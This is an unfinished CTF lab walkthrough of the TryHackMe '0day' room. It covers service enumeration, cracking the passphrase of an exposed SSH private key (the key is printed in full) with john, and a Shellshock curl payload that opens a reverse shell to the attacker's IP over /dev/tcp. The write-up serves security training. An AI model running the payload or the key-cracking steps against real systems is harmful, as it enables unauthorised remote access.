---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/0day/","tags":["offensivesecurity","ethicalhacking","0day","tryhackme"],"created":"2026-04-08T21:25:31.537+02:00","updated":"2026-04-11T12:21:41.550+02:00","dg-note-properties":{"tags":["offensivesecurity","ethicalhacking","0day","tryhackme"]}}
---



--------
## Description


---------
## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap%201.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/2nmap%202.png)


-------
## Enumeration

 **Endpoints Discovered**
* /secret > random turtle image
* /admin > blank 
* /backup > ssh key 
* /cgi-bin > Forbidden
* /robots.txt > useless text
* /uploads > blank page 
* /index.html
* /css
* /img
* /js
* /admin/index.html -> blank page
* /cgi-bin/test.cgi -> 404


**SSH Key from /backup**
```
-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547 T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P -----END RSA PRIVATE KEY-----
```

The SSH key is on one line and needs formatting before it is usable. After formatting the key let's use ssh2john to generate a hash from the key since this key is protected by a passphrase.


```bash
ssh2john id_rsa > hash
```

This generates a hash.

````bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
````


Let's crack it using john 

![](/img/user/Attachments/hashcracked.png)

The password is `letmein` let's use it as the passphrase for the ssh key and afterwards use the ssh-key to authenticate with an assumed existing user `turtle`.

![](/img/user/Attachments/ssh-passphrase.png)

Upon using the ssh key to connect to target it is clear that the signing algorithm is too old for the newer versions of ssh client. Thus the flag `-o PubkeyAcceptedKeyTypes=+ssh-rsa` is required.

```bash
ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa turtle@10.80.141.42
```


This command allows for connecting to the target. However it is not that easy. The password recovered by **john** only allows the use of the ssh-key since the key is protected by a passphrase (`letmein`). A password for the user `turtle` is also required which means further enumeration must be done. 

--------

### Discovering CVE-2003-1418

```bash
nikto -h 10.80.141.42
```

![](/img/user/Attachments/cve-scan.png)

Running nikto against the target reveals that the apache version on this target is vulnerable to the **ETag header** being used to reveal sensitive information.

**Description from NVD**
```
Apache HTTP Server 1.3.22 through 1.3.27 on OpenBSD allows remote attackers to obtain sensitive information via (1) the ETag header, which reveals the inode number, or (2) multipart MIME boundary, which reveals child process IDs (PID).
```

-----

### Circling back to Nmap

**Looking for UDP Ports**

![](/img/user/Attachments/udp.png)

Port 68 which is used by the DHCP is open/filtered. Filtered suggests that the firewall is blocking the requests from nmap. Further investigation must be done to confirm the availability of the service. 

#### Looking for Shellshock Vulnerability

/test.cgi endpoint reveals 

```bash
ffuf -u http://10.81.145.65/cgi-bin/FUZZ -w /usr/share/wordlists/dirb/common.tx  
t -e .cgi,.sh,.p1,.py
```

![](/img/user/Attachments/testcgi.png)

```bash
gobuster dir -u http://10.81.145.65/cgi-bin -w /usr/share/wordlists/dirb/common  
.txt -x cgi,sh,p1,py -o cgi.out
```

![](/img/user/Attachments/gobuster-test.png)

Let's test for the shellshock vulnerability against this endpoint since no CVE was revealed during the use of nmap or nikto

**Step 1 Set up a Listener**
```bash
nc -nvlp 4444
```


**Send the Shellshock Payload**
```bash
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.225.98/4444 0>&1" http://10.81.145.65/cgi-bin/test.cgi
```

![](/img/user/Attachments/shelllshock-payload-connection-received.png)

And it appears it is indeed vulnerable to the Shellshock vulnerability. A connection has been received by netcat.









-----
## Exploitation



----
## Post-exploitation


-----
## Flags

First flag: 
Second flag: 

------
## Attack Pattern Analysis (APA)